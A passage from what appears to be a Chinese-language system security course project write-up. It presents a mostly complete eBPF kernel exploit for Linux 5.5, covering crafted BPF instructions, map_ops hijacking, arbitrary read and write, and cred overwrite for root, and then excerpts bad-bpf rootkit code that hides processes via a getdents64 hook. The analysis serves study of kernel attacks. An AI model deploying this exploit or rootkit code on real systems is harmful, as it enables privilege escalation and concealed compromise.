<a href="#__codelineno-26-19" id="__codelineno-26-19" name="__codelineno-26-19"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">addr_high</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">addr_low</span><span class="p">;</span>
<a href="#__codelineno-26-20" id="__codelineno-26-20" name="__codelineno-26-20"></a><span class="p">}</span>
<a href="#__codelineno-26-21" id="__codelineno-26-21" name="__codelineno-26-21"></a>
<a href="#__codelineno-26-22" id="__codelineno-26-22" name="__codelineno-26-22"></a><span class="k">static</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">bpf_map_get_info_by_fd</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">info</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-26-23" id="__codelineno-26-23" name="__codelineno-26-23"></a><span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-26-24" id="__codelineno-26-24" name="__codelineno-26-24"></a><span class="w">        </span><span class="p">.</span><span class="n">map_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span>
<a href="#__codelineno-26-25" id="__codelineno-26-25" name="__codelineno-26-25"></a><span class="w">        </span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
<a href="#__codelineno-26-26" id="__codelineno-26-26" name="__codelineno-26-26"></a><span class="w">        </span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
<a href="#__codelineno-26-27" id="__codelineno-26-27" name="__codelineno-26-27"></a><span class="w">        </span><span class="p">.</span><span class="n">info</span><span class="p">.</span><span class="n">bpf_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span>
<a href="#__codelineno-26-28" id="__codelineno-26-28" name="__codelineno-26-28"></a><span class="w">        </span><span class="p">.</span><span class="n">info</span><span class="p">.</span><span class="n">info_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x100</span><span class="p">,</span>
<a href="#__codelineno-26-29" id="__codelineno-26-29" name="__codelineno-26-29"></a><span class="w">        </span><span class="p">.</span><span class="n">info</span><span class="p">.</span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">info</span><span class="p">,</span>
<a href="#__codelineno-26-30" id="__codelineno-26-30" name="__codelineno-26-30"></a><span class="w">    </span><span class="p">};</span>
<a href="#__codelineno-26-31" id="__codelineno-26-31" name="__codelineno-26-31"></a><span class="w">    </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_OBJ_GET_INFO_BY_FD</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<a href="#__codelineno-26-32" id="__codelineno-26-32" name="__codelineno-26-32"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">info</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span>
<a href="#__codelineno-26-33" id="__codelineno-26-33" name="__codelineno-26-33"></a><span class="p">}</span>
</code></pre></div>
<p>接下来<span class="heti-skip"><span class="heti-spacing"> </span>Part 4<span class="heti-spacing"> </span></span>用于任意地址写前的准备：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-27-1" id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="c1">// Part 4 (prepare for arbitrary write)</span>
<a href="#__codelineno-27-2" id="__codelineno-27-2" name="__codelineno-27-2"></a><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JNE</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_REG_8</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">),</span><span class="w">          </span><span class="c1">// if r8 != 2 goto +4 (exit(0))</span>
<a href="#__codelineno-27-3" id="__codelineno-27-3" name="__codelineno-27-3"></a><span class="n">BPF_STX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span><span class="w">      </span><span class="c1">// *(u64 *)(r7) = r0</span>
<a href="#__codelineno-27-4" id="__codelineno-27-4" name="__codelineno-27-4"></a><span class="n">BPF_ST_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mh">0x18</span><span class="p">,</span><span class="n">BPF_MAP_TYPE_STACK</span><span class="p">),</span><span class="w">    </span><span class="c1">// *(u32 *)(r7 + 0x18) = BPF_MAP_TYPE_STACK</span>
<a href="#__codelineno-27-5" id="__codelineno-27-5" name="__codelineno-27-5"></a><span class="n">BPF_ST_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mi">-1</span><span class="p">),</span><span class="w">                    </span><span class="c1">// *(u32 *)(r7 + 0x24) = -1 max_entries</span>
<a href="#__codelineno-27-6" id="__codelineno-27-6" name="__codelineno-27-6"></a><span class="n">BPF_ST_MEM</span><span class="p">(</span><span class="n">BPF_W</span><span class="p">,</span><span class="n">BPF_REG_7</span><span class="p">,</span><span class="mh">0x2c</span><span class="p">,</span><span class="mh">0x0</span><span class="p">),</span><span class="w">                   </span><span class="c1">// *(u32 *)(r7 + 0x2c) = 0 lock_off</span>
<a href="#__codelineno-27-7" id="__codelineno-27-7" name="__codelineno-27-7"></a>
<a href="#__codelineno-27-8" id="__codelineno-27-8" name="__codelineno-27-8"></a><span class="n">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span><span class="mh">0x0</span><span class="p">),</span><span class="w">                   </span><span class="c1">// exit(0)</span>
<a href="#__codelineno-27-9" id="__codelineno-27-9" name="__codelineno-27-9"></a><span class="n">BPF_EXIT_INSN</span><span class="p">(),</span>
</code></pre></div>
<p>这里将<span class="heti-skip"><span class="heti-spacing"> </span>Part 2<span class="heti-spacing"> </span></span>里算出来的<span class="heti-skip"><span class="heti-spacing"> </span>exp_buf<span class="heti-spacing"> </span></span>地址写到 <code>bpf_map</code> 开头，也就是<span class="heti-skip"><span class="heti-spacing"> </span>map_ops<span class="heti-spacing"> </span></span>的位置，所以我们创建一个函数指针数组将其内容修改为我们劫持后的函数表，修改其中 <code>map_push_elem</code> 为 <code>map_get_next_key</code>，再把内容复制到<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>中，作为<span class="heti-skip"><span class="heti-spacing"> </span>r0<span class="heti-spacing"> </span></span>参数传递进来。然后修改 <code>bpf_map</code> 的 <code>map_type</code>、<code>max_entries</code>、<code>spin_lock_off</code> 即可。接下来通过调用 <code>bpf_update_elem</code> 就可以实现任意地址写：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-28-1" id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-28-2" id="__codelineno-28-2" name="__codelineno-28-2"></a><span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-28-3" id="__codelineno-28-3" name="__codelineno-28-3"></a><span class="w">        </span><span class="p">.</span><span class="n">map_fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span>
<a href="#__codelineno-28-4" id="__codelineno-28-4" name="__codelineno-28-4"></a><span class="w">        </span><span class="p">.</span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
<a href="#__codelineno-28-5" id="__codelineno-28-5" name="__codelineno-28-5"></a><span class="w">        </span><span class="p">.</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
<a href="#__codelineno-28-6" id="__codelineno-28-6" name="__codelineno-28-6"></a><span class="w">        </span><span class="p">.</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span>
<a href="#__codelineno-28-7" id="__codelineno-28-7" name="__codelineno-28-7"></a><span class="w">    </span><span class="p">};</span>
<a href="#__codelineno-28-8" id="__codelineno-28-8" name="__codelineno-28-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<a href="#__codelineno-28-9" id="__codelineno-28-9" name="__codelineno-28-9"></a><span class="p">}</span>
</code></pre></div>
<p><code>bpf_update_elem(0, exp_buf, exp_mapfd, addr)</code> 就可以实现 <code>*(u32 *)addr = exp_buf[0] + 1</code> 的任意地址写。</p>
<h3 id="_4">利用结果<a class="headerlink" href="#_4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p>利用任意地址读，我们可以读取到内核中的 <code>per_cpu_offset</code>，然后根据其偏移<span class="heti-skip"><span class="heti-spacing"> </span>0x17d00<span class="heti-spacing"> </span></span>得到 <code>current_task</code> 地址，再偏移<span class="heti-skip"><span class="heti-spacing"> </span>0x648<span class="heti-spacing"> </span></span>得到其中 <code>comm</code> 字段，即当前进程执行的命令，我们令其为 <code>0x353338385f707865</code> 即 <code>exp_8835</code>，我们后续也需要将<span class="heti-skip"><span class="heti-spacing"> </span>exp<span class="heti-spacing"> </span></span>编译后的可执行文件命名为此名称。查询到当前进程的<span class="heti-skip"><span class="heti-spacing"> </span>task<span class="heti-spacing"> </span></span>结构体后，就可以根据其偏移<span class="heti-skip"><span class="heti-spacing"> </span>0x638<span class="heti-spacing"> </span></span>得到 <code>cred</code> 结构体，即当前进程的权限信息：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-29-1" id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="n">task_struct</span><span class="p">,</span><span class="w"> </span><span class="n">cred</span><span class="p">,</span><span class="w"> </span><span class="n">current_task</span><span class="p">,</span><span class="w"> </span><span class="n">comm</span><span class="p">;</span>
<a href="#__codelineno-29-2" id="__codelineno-29-2" name="__codelineno-29-2"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="n">per_cpu_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read</span><span class="p">(</span><span class="mh">0xffffffff822c26c0</span><span class="p">);</span>
<a href="#__codelineno-29-3" id="__codelineno-29-3" name="__codelineno-29-3"></a><span class="n">printf</span><span class="p">(</span><span class="s">"[+] per_cpu_offset:</span><span class="se">\t\t</span><span class="s">0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">per_cpu_offset</span><span class="p">);</span>
<a href="#__codelineno-29-4" id="__codelineno-29-4" name="__codelineno-29-4"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-29-5" id="__codelineno-29-5" name="__codelineno-29-5"></a><span class="w">    </span><span class="n">current_task</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x17d00</span><span class="p">);</span>
<a href="#__codelineno-29-6" id="__codelineno-29-6" name="__codelineno-29-6"></a><span class="w">    </span><span class="n">comm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read</span><span class="p">(</span><span class="n">current_task</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x648</span><span class="p">);</span>
<a href="#__codelineno-29-7" id="__codelineno-29-7" name="__codelineno-29-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">comm</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x353338385f707865</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-29-8" id="__codelineno-29-8" name="__codelineno-29-8"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] current_task:</span><span class="se">\t\t</span><span class="s">0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">current_task</span><span class="p">);</span>
<a href="#__codelineno-29-9" id="__codelineno-29-9" name="__codelineno-29-9"></a><span class="w">        </span><span class="n">task_struct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current_task</span><span class="p">;</span>
<a href="#__codelineno-29-10" id="__codelineno-29-10" name="__codelineno-29-10"></a><span class="w">        </span><span class="k">break</span><span class="p">;</span>
<a href="#__codelineno-29-11" id="__codelineno-29-11" name="__codelineno-29-11"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-29-12" id="__codelineno-29-12" name="__codelineno-29-12"></a><span class="w">    </span><span class="n">hextostr</span><span class="p">(</span><span class="n">comm</span><span class="p">);</span>
<a href="#__codelineno-29-13" id="__codelineno-29-13" name="__codelineno-29-13"></a><span class="p">}</span>
<a href="#__codelineno-29-14" id="__codelineno-29-14" name="__codelineno-29-14"></a><span class="n">hextostr</span><span class="p">(</span><span class="n">comm</span><span class="p">);</span>
<a href="#__codelineno-29-15" id="__codelineno-29-15" name="__codelineno-29-15"></a>
<a href="#__codelineno-29-16" id="__codelineno-29-16" name="__codelineno-29-16"></a><span class="n">cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arbitrary_read</span><span class="p">(</span><span class="n">task_struct</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x638</span><span class="p">);</span>
<a href="#__codelineno-29-17" id="__codelineno-29-17" name="__codelineno-29-17"></a><span class="n">printf</span><span class="p">(</span><span class="s">"[+] cred:</span><span class="se">\t</span><span class="s">0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">cred</span><span class="p">);</span>
</code></pre></div>
<p>接下来我们要利用任意地址写来覆盖<span class="heti-skip"><span class="heti-spacing"> </span>cred<span class="heti-spacing"> </span></span>结构体，先创建一个写满了<span class="heti-skip"><span class="heti-spacing"> </span>map_get_next_key<span class="heti-spacing"> </span></span>函数指针的数组，然后将其覆盖到<span class="heti-skip"><span class="heti-spacing"> </span>map_ops<span class="heti-spacing"> </span></span>中，再将<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>类型改为<span class="heti-skip"><span class="heti-spacing"> </span>stack<span class="heti-spacing"> </span></span>类型，这样就可以通过调用<span class="heti-skip"><span class="heti-spacing"> </span>map_push_elem<span class="heti-spacing"> </span></span>来调用<span><span class="heti-spacing"> </span>map_get_next_key</span>，从而实现任意地址写：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-30-1" id="__codelineno-30-1" name="__codelineno-30-1"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fake_map_ops</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-30-2" id="__codelineno-30-2" name="__codelineno-30-2"></a><span class="w">    </span><span class="n">kernel_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x16cfa0</span><span class="p">,</span>
<a href="#__codelineno-30-3" id="__codelineno-30-3" name="__codelineno-30-3"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-30-4" id="__codelineno-30-4" name="__codelineno-30-4"></a><span class="w">    </span><span class="n">kernel_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x16cfa0</span><span class="p">,</span>
<a href="#__codelineno-30-5" id="__codelineno-30-5" name="__codelineno-30-5"></a><span class="p">};</span>
<a href="#__codelineno-30-6" id="__codelineno-30-6" name="__codelineno-30-6"></a><span class="n">memcpy</span><span class="p">(</span><span class="n">exp_buf</span><span class="p">,</span><span class="w"> </span><span class="n">fake_map_ops</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">fake_map_ops</span><span class="p">));</span>
<a href="#__codelineno-30-7" id="__codelineno-30-7" name="__codelineno-30-7"></a><span class="n">execute_with_op</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<a href="#__codelineno-30-8" id="__codelineno-30-8" name="__codelineno-30-8"></a><span class="n">exp_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0</span><span class="mi">-1</span><span class="p">;</span>
<a href="#__codelineno-30-9" id="__codelineno-30-9" name="__codelineno-30-9"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">8</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-30-10" id="__codelineno-30-10" name="__codelineno-30-10"></a><span class="w">    </span><span class="n">bpf_update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">exp_buf</span><span class="p">,</span><span class="w"> </span><span class="n">exp_mapfd</span><span class="p">,</span><span class="w"> </span><span class="n">cred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<a href="#__codelineno-30-11" id="__codelineno-30-11" name="__codelineno-30-11"></a><span class="p">}</span>
</code></pre></div>
<p>覆盖了<span class="heti-skip"><span class="heti-spacing"> </span>cred<span class="heti-spacing"> </span></span>权限为<span class="heti-skip"><span class="heti-spacing"> </span>0<span class="heti-spacing"> </span></span>后即可实现提权。我们基于<span class="heti-skip"><span class="heti-spacing"> </span>Linux-5.5<span class="heti-spacing"> </span></span>的内核，准备了一个建议<span class="heti-skip"><span class="heti-spacing"> </span>rootfs<span class="heti-spacing"> </span></span>文件系统，其中包含了我们编译好的<span class="heti-skip"><span class="heti-spacing"> </span>exp<span class="heti-spacing"> </span></span>代码，然后通过<span class="heti-skip"><span class="heti-spacing"> </span>qemu<span class="heti-spacing"> </span></span>启动内核，执行<span><span class="heti-spacing"> </span>exp</span>，实现提权：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img5.png"><img src="/assets/images/sec/syssec/project/img5.png" style="margin: 0 auto;" width="100%"/></a>
</div>
<h2 id="ebpf-rootkit"><span>eBPF rootkit<span class="heti-spacing"> </span></span>安全威胁分析<a class="headerlink" href="#ebpf-rootkit" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<h3 id="ebpf-rootkit_1"><span>eBPF rootkit<span class="heti-spacing"> </span></span>原理<a class="headerlink" href="#ebpf-rootkit_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p><span>rootkit<span class="heti-spacing"> </span></span>是一种恶意软件，是单词<span class="heti-skip"><span class="heti-spacing"> </span>root<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>kit<span class="heti-spacing"> </span></span>的组合。<span>root<span class="heti-spacing"> </span></span>是具有操作系统管理员身份的用户帐户。同时，<span>kit<span class="heti-spacing"> </span></span>是指一套软件工具。因此，<span>rootkit<span class="heti-spacing"> </span></span>是一组工具，可以为攻击者提供系统中的最高权限。 </p>
<p><span>rootkit<span class="heti-spacing"> </span></span>特别危险，因为它们旨在隐藏它们在设备上的存在。如果将<span class="heti-skip"><span class="heti-spacing"> </span>rootkit<span class="heti-spacing"> </span></span>安装到机器上（通常通过网络钓鱼<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，攻击者可以远程访问和控制受害机器。因为它们有<span class="heti-skip"><span class="heti-spacing"> </span>root<span class="heti-spacing"> </span></span>权限，<span>rootkit<span class="heti-spacing"> </span></span>可用于执行诸如停用防病毒软件、监视活动、窃取敏感数据或在设备上执行其他恶意软件等高权限操作。</p>
<p>而<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>就非常适合于制作<span class="heti-skip"><span class="heti-spacing"> </span>rootkit<span class="heti-spacing"> </span></span>程序，让我们回顾<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>技术的特性：</p>
<ul>
<li><span>eBPF<span class="heti-spacing"> </span></span>技术允许在用户态编写代码，被<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>扫描鉴定无问题后，送入内核执行；</li>
<li><span>eBPF<span class="heti-spacing"> </span></span>技术能够在不修改内核代码的前提下，查看内核数据或修改内核功能；</li>
<li><span>eBPF<span class="heti-spacing"> </span></span>可以在<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>系统的各个地方插桩，在执行到指定位置时，执行用户自定的代码，实现数据的搜集和修改；</li>
<li>因此攻击者可以通过将<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>加载到内核中来<span class="heti-skip"><span class="heti-spacing"> </span>hook<span class="heti-spacing"> </span></span>系统函数拦截和修改他们的行为，实现篡改内核数据结构、隐藏进程、文件或网络连接等目的。</li>
</ul>
<p>此外，由于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF rootkit<span class="heti-spacing"> </span></span>运行在内核态，传统的用户态防护措施很难检测到它的存在。同时，<span>eBPF rootkit<span class="heti-spacing"> </span></span>可以动态加载和卸载，性能开销小，不需要修改内核代码或文件系统，增加了检测和防御的难度。</p>
<h3 id="bad-bpf"><span>bad-bpf<span class="heti-spacing"> </span></span>程序复现<a class="headerlink" href="#bad-bpf" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p><span>bad-bpf<span class="heti-spacing"> </span></span>是<span class="heti-skip"><span class="heti-spacing"> </span>PatH<span class="heti-spacing"> </span></span>实现的一个<span><span class="heti-spacing"> </span>eBPF rootkit</span>，并在<span class="heti-skip"><span class="heti-spacing"> </span>DEFCON '29<span class="heti-spacing"> </span></span>上进行了题为 <em>Warping Reality: Creating and Countering the Next Generation of Linux Rootkits</em> 的展示演讲。其实现了隐藏进程、劫持新建进程、用户提权等多种功能。</p>
<h4 id="_5">隐藏进程<a class="headerlink" href="#_5" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
<p><span>pidhide<span class="heti-spacing"> </span></span>程序通过<span class="heti-skip"><span class="heti-spacing"> </span>hook getdents64<span class="heti-spacing"> </span></span>系统调用来取消与<span class="heti-skip"><span class="heti-spacing"> </span>PID<span class="heti-spacing"> </span></span>相关联的<span class="heti-skip"><span class="heti-spacing"> </span>/proc/<span class="heti-spacing"> </span></span>文件夹的链接，使<span class="heti-skip"><span class="heti-spacing"> </span>ps<span class="heti-spacing"> </span></span>无法查找到<span class="heti-skip"><span class="heti-spacing"> </span>/proc/<span class="heti-spacing"> </span></span>文件夹中的进程信息。</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-31-1" id="__codelineno-31-1" name="__codelineno-31-1"></a><span class="n">SEC</span><span class="p">(</span><span class="s">"tp/syscalls/sys_exit_getdents64"</span><span class="p">)</span>
<a href="#__codelineno-31-2" id="__codelineno-31-2" name="__codelineno-31-2"></a><span class="kt">int</span><span class="w"> </span><span class="n">handle_getdents_patch</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">trace_event_raw_sys_exit</span><span class="w"> </span><span class="o">*</span><span class="n">ctx</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-31-3" id="__codelineno-31-3" name="__codelineno-31-3"></a><span class="w">    </span><span class="err">···</span>
<a href="#__codelineno-31-4" id="__codelineno-31-4" name="__codelineno-31-4"></a><span class="w">    </span><span class="kt">short</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">d_reclen_new</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">d_reclen_previous</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">d_reclen</span><span class="p">;</span>
<a href="#__codelineno-31-5" id="__codelineno-31-5" name="__codelineno-31-5"></a><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_probe_write_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dirp_previous</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">d_reclen_new</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">d_reclen_new</span><span class="p">));</span>
<a href="#__codelineno-31-6" id="__codelineno-31-6" name="__codelineno-31-6"></a><span class="w">    </span><span class="err">···</span>
<a href="#__codelineno-31-7" id="__codelineno-31-7" name="__codelineno-31-7"></a><span class="p">}</span>
</code></pre></div>
<p>将<span class="heti-skip"><span class="heti-spacing"> </span>linux_dirent64<span class="heti-spacing"> </span></span>结构体的<span class="heti-skip"><span class="heti-spacing"> </span>d_reclen<span class="heti-spacing"> </span></span>字段修改为<span><span class="heti-spacing"> </span>d_reclen_previous + d_reclen</span>，使得读取目录时跳过隐藏的进程目录。</p>
<p>我们通过<span class="heti-skip"><span class="heti-spacing"> </span>docker<span class="heti-spacing"> </span></span>运行一个<span class="heti-skip"><span class="heti-spacing"> </span>/bin/bash<span class="heti-spacing"> </span></span>进程，可以通过<span class="heti-skip"><span class="heti-spacing"> </span>ps<span class="heti-spacing"> </span></span>看到这个进程：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img6.png"><img src="/assets/images/sec/syssec/project/img6.png" style="margin: 0 auto;" width="80%"/></a>
</div>
<p>然后运行<span class="heti-skip"><span class="heti-spacing"> </span>pidhide<span class="heti-spacing"> </span></span>程序，加载恶意的<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序，使得这个进程被隐藏，通过<span class="heti-skip"><span class="heti-spacing"> </span>ps<span class="heti-spacing"> </span></span>无法查看到：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img7.png"><img src="/assets/images/sec/syssec/project/img7.png" style="margin: 0 auto;" width="100%"/></a>
</div>
<h4 id="_6">劫持新建进程<a class="headerlink" href="#_6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h4>
